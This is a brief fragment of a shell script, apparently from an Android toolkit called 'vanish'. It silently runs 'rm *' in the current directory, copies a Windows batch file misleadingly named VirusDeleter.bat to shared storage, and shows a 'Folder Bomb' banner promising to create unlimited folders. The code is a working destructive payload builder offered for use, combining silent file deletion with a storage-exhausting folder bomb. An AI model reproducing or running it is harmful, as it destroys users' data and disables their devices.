...
rm * >/dev/null 2>&1
cd $HOME
cp $HOME/vanish/core/src/windows/VirusDeleter.bat /sdcard/vanrc >/dev/null 2>&1
clear
echo -e "\e[91m   
       ┌─┐┌─┐┬  ┌┬┐┌─┐┬─┐  ┌┐ ┌─┐┌┬┐┌┐ 
       ├┤ │ ││   ││├┤ ├┬┘  ├┴┐│ ││││├┴┐
...
"
echo
echo -e "  \e[91m[\e[0mThis will create unlimited no. of folders.\e[91m]\e[0m"
